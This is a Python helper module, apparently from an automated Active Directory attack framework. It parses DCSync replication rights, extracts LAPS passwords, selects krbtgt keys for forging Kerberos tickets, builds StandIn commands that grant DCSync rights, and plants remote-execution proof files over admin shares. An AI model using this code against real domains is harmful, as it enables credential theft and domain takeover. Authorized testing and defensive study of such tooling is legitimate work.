def _parse_probe_bool(value: Any) -> bool | None:
    normalized = _normalize(value)
    if normalized in {"true", "1", "yes", "enabled", "on"}:
        return True
    if normalized in {"false", "0", "no", "disabled", "off"}:
        return False
    return None


def _record_status_from_verdict(verdict: str) -> str:
    normalized = _normalize(verdict)
    if normalized == "achieved":
        return "achieved"
    if normalized == "blocked":
        return "blocked"
    return "failed"


_SYSTEM_IDENTITY_RE = re.compile(
    r"(?:nt\s+authority\\system|nt\s+authority/system|\bs-1-5-18\b|\bwhoami\s*[:=]?\s*system\b)",
    re.IGNORECASE,
)


def _metadata_has_system_identity(metadata: dict[str, Any]) -> bool:
    values = [
        metadata.get("integrity"),
        metadata.get("user"),
        metadata.get("username"),
        metadata.get("identity"),
        metadata.get("principal"),
    ]
    text = " ".join(_text(value) for value in values).casefold()
    return "system" in text or "s-1-5-18" in text


def _has_any(text: str, needles: tuple[str, ...]) -> bool:
    return any(needle in text for needle in needles)


def _has_all(text: str, needles: tuple[str, ...]) -> bool:
    return all(needle in text for needle in needles)


def _replication_right_probe_from_text(text: str) -> dict[str, bool]:
    low = _text(text).casefold()
    get_changes = (
        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" in low
        or re.search(r"\bget[- ]changes\b(?![- ]all)", low) is not None
        or re.search(r"\breplicating directory changes\b(?! all)", low) is not None
    )
    get_changes_all = (
        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" in low
        or "get-changes-all" in low
        or "get changes all" in low
        or "replicating directory changes all" in low
    )
    get_changes_filtered = (
        "89e95b76-444d-4c62-991a-0facbeda640c" in low
        or "filtered set" in low
        or "get-changes-in-filtered-set" in low
    )
    ace_present = get_changes or get_changes_all or get_changes_filtered
    return {
        "ace_present": ace_present,
        "get_changes": get_changes,
        "get_changes_all": get_changes_all,
        "get_changes_in_filtered_set": get_changes_filtered,
    }


def _managed_secret_attribute(text: str) -> tuple[str, int]:
    for attr in ("ms-mcs-admpwd", "mslaps-password"):
        value = _attribute_value(text, attr)
        if _usable_managed_secret_value(value):
            return attr, len(value)
    return "", 0


def _attribute_present(text: str, attr: str) -> bool:
    return bool(_attribute_value(text, attr))


def _attribute_value(text: str, attr: str) -> str:
    attr_rx = re.escape(attr).replace("\\-", "[-_]")
    pattern = re.compile(rf"(?im)^\s*{attr_rx}\s*[:=]\s*(.+?)\s*$")
    for match in pattern.finditer(_text(text)):
        value = match.group(1).strip().strip("'\"")
        if value:
            return value
    return ""


def _usable_managed_secret_value(value: str) -> bool:
    text = _text(value).strip()
    low = text.casefold()
    if not text:
        return False
    if low in {"null", "none", "not set", "not_set", "no_result", "system.byte[]", "<redacted>", "redacted"}:
        return False
    if any(token in low for token in ("expirationtime", "encryptedpassword", "placeholder", "replace_me")):
        return False
    return True


_REPLICATION_RIGHT_GUIDS = {
    "ds-replication-get-changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "replication-get-changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "get-changes": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "ds-replication-get-changes-all": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "replication-get-changes-all": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "get-changes-all": "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
    "ds-replication-get-changes-in-filtered-set": "89e95b76-444d-4c62-991a-0facbeda640c",
    "replication-get-changes-in-filtered-set": "89e95b76-444d-4c62-991a-0facbeda640c",
    "get-changes-in-filtered-set": "89e95b76-444d-4c62-991a-0facbeda640c",
}


def _target_fields(target: Any) -> dict[str, str]:
    fields: dict[str, str] = {}
    for part in _text(target).split(";"):
        key, sep, value = part.partition("=")
        if sep and key.strip():
            fields[_normalize(key)] = _text(value)
    return fields


def _input_text(inputs: dict[str, Any], *keys: str) -> str:
    for key in keys:
        for existing_key, value in inputs.items():
            if _normalize(existing_key) == _normalize(key):
                text = _text(value)
                if text:
                    return text
    return ""


def _input_list(inputs: dict[str, Any], *keys: str) -> list[str]:
    for key in keys:
        for existing_key, value in inputs.items():
            if _normalize(existing_key) != _normalize(key):
                continue
            if isinstance(value, (list, tuple, set)):
                return [_text(item).strip() for item in value if _text(item).strip()]
            text = _text(value)
            if text:
                return [part.strip() for part in re.split(r"[,\s]+", text) if part.strip()]
    return []


def _dedupe_texts(values: Iterable[Any]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for value in values:
        text = _text(value).strip()
        if not text:
            continue
        key = text.casefold()
        if key in seen:
            continue
        seen.add(key)
        out.append(text)
    return out


def _input_bool(inputs: dict[str, Any], key: str, default: bool = False) -> bool:
    for existing_key, value in inputs.items():
        if _normalize(existing_key) != _normalize(key):
            continue
        if isinstance(value, bool):
            return value
        text = _normalize(value)
        if text in {"1", "true", "yes", "y", "on"}:
            return True
        if text in {"0", "false", "no", "n", "off"}:
            return False
    return default


def _ticket_key(inputs: dict[str, Any], intent: dict[str, Any]) -> tuple[str, str]:
    sources = []
    if isinstance(intent, dict):
        sources.append(intent)
    sources.append(inputs)
    for key_type, names in (
        ("aes256", ("aes256", "krbtgt_aes256")),
        ("aes128", ("aes128", "krbtgt_aes128")),
        ("rc4", ("rc4", "ntlm", "nthash", "krbtgt_hash")),
    ):
        for source in sources:
            value = _input_text(source, *names)
            if value:
                return key_type, value
    explicit = _input_text(inputs, "key", "krbtgt_key", "credential", "credential_text", "secret")
    if explicit:
        key_type = _normalize(_input_text(inputs, "key_type", "etype")) or _infer_ticket_key_type(explicit)
        return key_type, explicit
    return "", ""


def _infer_ticket_key_type(value: str) -> str:
    text = _text(value).strip()
    if re.fullmatch(r"[0-9a-fA-F]{64}", text):
        return "aes256"
    if re.fullmatch(r"[0-9a-fA-F]{32}", text):
        return "rc4"
    return "key"


def _standin_grant_args(target_dn: str, principal: str, guid: str) -> str:
    return " ".join([
        "--object", _quote_cli(_standin_object_filter(target_dn)),
        "--grant", _quote_cli(principal),
        "--guid", _quote_cli(guid),
    ])


def _standin_dcsync_grant_args(target_dn: str, principal: str) -> str:
    return " ".join([
        "--object", _quote_cli(_standin_object_filter(target_dn)),
        "--grant", _quote_cli(principal),
        "--type", "DCSync",
    ])


def _standin_object_filter(target_dn: str) -> str:
    text = _text(target_dn).strip()
    if text.casefold().startswith("distinguishedname="):
        return text
    if text.casefold().startswith("dc="):
        return "distinguishedname=" + text
    return text


def _qualified_domain_principal(principal: str, domain: str) -> str:
    text = _text(principal).strip()
    if not text or "\\" in text or "@" in text:
        return text
    netbios = _text(domain).strip().split(".", 1)[0].upper()
    return f"{netbios}\\{text}" if netbios else text


def _replication_right_guids(rights: Any) -> tuple[list[tuple[str, str]], list[str]]:
    items = list(rights) if isinstance(rights, (list, tuple)) else [
        "DS-Replication-Get-Changes",
        "DS-Replication-Get-Changes-All",
    ]
    out: list[tuple[str, str]] = []
    unknown: list[str] = []
    seen: set[str] = set()
    for item in items:
        label = _text(item)
        normalized = _normalize_right_name(label)
        guid = label.casefold() if _GUID_RE.fullmatch(label.strip()) else _REPLICATION_RIGHT_GUIDS.get(normalized, "")
        if guid and guid not in seen:
            out.append((normalized or guid, guid))
            seen.add(guid)
        elif not guid:
            unknown.append(label)
    return out, unknown


_GUID_RE = re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")


def _normalize_right_name(value: Any) -> str:
    text = _normalize(value).replace("_", "-").replace(" ", "-")
    while "--" in text:
        text = text.replace("--", "-")
    return text


def _domain_dn(domain: str) -> str:
    return ",".join(f"DC={part}" for part in _normalize(domain).split(".") if part)


def _host_domain_from_target(value: Any) -> tuple[str, str]:
    text = _normalize(_text(value).strip().strip("\\/"))
    if not text:
        return "", ""
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    parts = [part for part in text.split(".") if part]
    if len(parts) >= 3:
        return parts[0], ".".join(parts[1:])
    return _host_short(text), ""


def _host_short(value: Any) -> str:
    text = _normalize(_text(value).strip().strip("\\/"))
    if not text:
        return ""
    if "/" in text and not text.startswith("\\\\"):
        _, _, text = text.partition("/")
    if "@" in text:
        text = text.split("@", 1)[0]
    if text.endswith("$"):
        text = text[:-1]
    return text.split(".", 1)[0].strip()


def _gpo_local_refresh_applies(current_host: Any, affected_hosts: list[str] | tuple[str, ...] | None) -> bool:
    affected = {_host_short(host) for host in (affected_hosts or []) if _host_short(host)}
    if not affected:
        return False
    host = _host_short(current_host)
    if not host:
        return False
    return host in affected


def _host_fqdn(host: Any, domain: Any) -> str:
    host_text = _normalize(_text(host).strip().strip("\\/"))
    domain_text = _normalize(domain).strip(".")
    if not host_text:
        return ""
    if "." in host_text or not domain_text:
        return host_text
    return f"{host_text}.{domain_text}"


def canonical_host_for_domain(host: Any, domain: Any) -> str:
    """Return a single-label host when ``host`` is valid for ``domain``; else ``""``."""
    host_text = _normalize_dns_name(host)
    domain_text = _normalize_dns_name(domain)
    if not host_text or not domain_text:
        return ""
    host_parts = host_text.split(".")
    domain_parts = domain_text.split(".")
    if len(host_parts) == 1:
        return host_parts[0]
    if len(host_parts) != len(domain_parts) + 1:
        return ""
    if host_parts[1:] != domain_parts:
        return ""
    return host_parts[0]


def _normalize_dns_name(value: Any) -> str:
    text = str(value or "").strip().casefold()
    if not text or text.startswith(".") or text.endswith(".") or ".." in text or any(ch.isspace() for ch in text):
        return ""
    labels = text.split(".")
    if not labels:
        return ""
    for label in labels:
        if not re.fullmatch(r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?", label):
            return ""
    return ".".join(labels)


def _unc_from_windows_path(host: Any, domain: Any, path: Any) -> str:
    host_name = _host_fqdn(host, domain)
    win_path = _text(path).strip().strip('"').replace("/", "\\")
    if not host_name or not win_path:
        return ""
    drive_match = re.match(r"^([a-zA-Z]):\\?(.*)$", win_path)
    if drive_match:
        drive = drive_match.group(1).upper()
        tail = drive_match.group(2).lstrip("\\")
        return f"\\\\{host_name}\\{drive}$" + (f"\\{tail}" if tail else "")
    tail = win_path.lstrip("\\")
    return f"\\\\{host_name}\\C$\\{tail}"


def _default_remote_exec_proof_filename(host: Any, callback_id: Any) -> str:
    return f"sage_remote_exec_{_slug(host)}_{_slug(callback_id)}.txt"


def _remote_exec_proof_default_path(host: Any, callback_id: Any) -> str:
    return f"C:\\Windows\\Temp\\{_default_remote_exec_proof_filename(host, callback_id)}"


def _parse_drive_unc(path: Any) -> tuple[str, str, str] | None:
    text = _text(path).strip().strip('"').replace("/", "\\")
    match = re.match(r"^\\+([^\\]+)\\([a-zA-Z])\$(?:\\(.*))?$", text)
    if not match:
        return None
    return match.group(1), match.group(2).upper(), (match.group(3) or "").strip("\\")


def _proof_tail_looks_like_directory(tail: Any) -> bool:
    text = _text(tail).strip().strip('"').replace("/", "\\").rstrip("\\")
    if not text:
        return True
    last = text.rsplit("\\", 1)[-1].casefold()
    return last in {
        "c$",
        "admin$",
        "windows",
        "temp",
        "tmp",
        "users",
        "public",
        "desktop",
        "documents",
        "downloads",
    }


def _append_proof_filename_if_directory(path: str, filename: str) -> str:
    clean = _text(path).strip().strip('"').replace("/", "\\")
    if clean.endswith("\\") or _proof_tail_looks_like_directory(clean):
        return clean.rstrip("\\") + "\\" + filename
    return clean


def _normalize_remote_exec_proof_paths(
    host: Any,
    domain: Any,
    callback_id: Any,
    proof_path: Any,
    proof_unc: Any,
) -> tuple[str, str]:
    filename = _default_remote_exec_proof_filename(host, callback_id)
    local_path = _text(proof_path).strip().strip('"').replace("/", "\\")
    unc_path = _text(proof_unc).strip().strip('"').replace("/", "\\")

    path_unc = _parse_drive_unc(local_path)
    if path_unc:
        _, drive, tail = path_unc
        tail = _append_proof_filename_if_directory(tail, filename)
        local_path = f"{drive}:\\" + tail.lstrip("\\")
        if not unc_path:
            unc_path = _unc_from_windows_path(host, domain, local_path)
    elif not local_path:
        local_path = _remote_exec_proof_default_path(host, callback_id)
    else:
        local_path = _append_proof_filename_if_directory(local_path, filename)

    unc_drive = _parse_drive_unc(unc_path)
    if unc_drive:
        _, drive, tail = unc_drive
        tail = _append_proof_filename_if_directory(tail, filename)
        unc_path = _unc_from_windows_path(host, domain, f"{drive}:\\" + tail.lstrip("\\"))
    elif not unc_path:
        unc_path = _unc_from_windows_path(host, domain, local_path)

    return local_path, unc_path


def _gpo_from_execution_context(value: str) -> str:
    text = _text(value)
    prefix = "gpo-system-exec:"
    if text.casefold().startswith(prefix):
        return _normalize(text[len(prefix):])
    return ""


def _task_name(prefix: str, *parts: str) -> str:
    tokens = [_task_name_token(prefix)]
    tokens.extend(_task_name_token(part) for part in parts if _text(part))
    name = "".join(token for token in tokens if token) or "Task"
    return name[:64]


def _task_name_from_text(value: Any) -> str:
    return _task_name_token(value)[:64]


def _task_name_token(value: Any) -> str:
    text = re.sub(r"sage", "", _text(value), flags=re.IGNORECASE)
    chunks = re.findall(r"[A-Za-z0-9]+", text)
    return "".join(_task_name_chunk(chunk) for chunk in chunks)


def _task_name_chunk(chunk: str) -> str:
    if chunk.isupper():
        return chunk
    return chunk[:1].upper() + chunk[1:]


def _slug(value: Any) -> str:
    text = re.sub(r"[^a-zA-Z0-9]+", "_", _text(value).strip().lower())
    text = re.sub(r"_+", "_", text).strip("_")
    return text or "target"


def _quote_cli(value: Any) -> str:
    text = _text(value)
    escaped = text.replace('"', '\\"')
    if not escaped:
        return '""'
    if any(ch.isspace() for ch in escaped) or any(ch in escaped for ch in (">", "<", "|", "&", "^")):
        return f'"{escaped}"'
    return escaped


_NET_GROUP_DOMAIN_ADD_MEMBER_RE = re.compile(
    r'(?P<prefix>\bnet(?:\.exe)?\s+group\s+(?:"[^"]+"|\S+)\s+)'
    r'(?P<quote>"?)(?P<domain>[A-Za-z0-9_.-]+)\\(?P<user>[^"\s&|]+)(?P=quote)'
    r'(?=(?:(?![&|]).)*\s/add\b)'
    r'(?=(?:(?![&|]).)*\s/domain\b)',
    re.IGNORECASE,
)


def _normalize_gpo_system_task_arguments(arguments: Any) -> str:
    text = _text(arguments)

    def replace_member(match: re.Match) -> str:
        quote = match.group("quote") or ""
        return f"{match.group('prefix')}{quote}{match.group('user')}{quote}"

    return _NET_GROUP_DOMAIN_ADD_MEMBER_RE.sub(replace_member, text)


def _gpo_system_task_redirect_path(arguments: Any) -> str:
    text = _text(arguments)
    match = re.search(r"(?<![0-9])>\s*(?P<path>\"[^\"]+\"|'[^']+'|[^&|<>]+)", text)
    if not match:
        return ""
    path = match.group("path").strip()
    path = re.sub(r"\s+\d?>.*$", "", path).strip()
    path = re.sub(r"\s+\d$", "", path).strip()
    return path.strip("\"'")


def _normalize(value: Any) -> str:
    return " ".join(_text(value).strip().casefold().split())


def _text(value: Any) -> str:
    if value is None:
        return ""
    return str(value)


def _split_leading_bytes_literal(text: str) -> tuple[str, str] | None:
    stripped = text.lstrip()
    leading_ws = text[: len(text) - len(stripped)]
    if len(stripped) < 3 or stripped[0] not in "bB" or stripped[1] not in {"'", '"'}:
        return None
    quote = stripped[1]
    escaped = False
    for index in range(2, len(stripped)):
        char = stripped[index]
        if escaped:
            escaped = False
            continue
        if char == "\\":
            escaped = True
            continue
        if char == quote:
            return leading_ws + stripped[: index + 1], stripped[index + 1 :]
    return None


def _task_output_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bytes):
        return value.decode(errors="replace")
    text = str(value)
    stripped = text.strip()
    if len(stripped) >= 3 and stripped[0] in "bB" and stripped[1] in {"'", '"'}:
        try:
            literal = ast.literal_eval(stripped)
            if isinstance(literal, bytes):
                text = literal.decode(errors="replace")
            elif isinstance(literal, str):
                text = literal
        except Exception:
            split = _split_leading_bytes_literal(text)
            if split:
                literal_text, remainder = split
                try:
                    literal = ast.literal_eval(literal_text.strip())
                    if isinstance(literal, bytes):
                        text = literal.decode(errors="replace") + remainder
                    elif isinstance(literal, str):
                        text = literal + remainder
                except Exception:
                    pass
    return (
        text
        .replace("\\r\\n", "\n")
        .replace("\\n", "\n")
        .replace("\\r", "\n")
        .replace("\\t", "\t")
    )
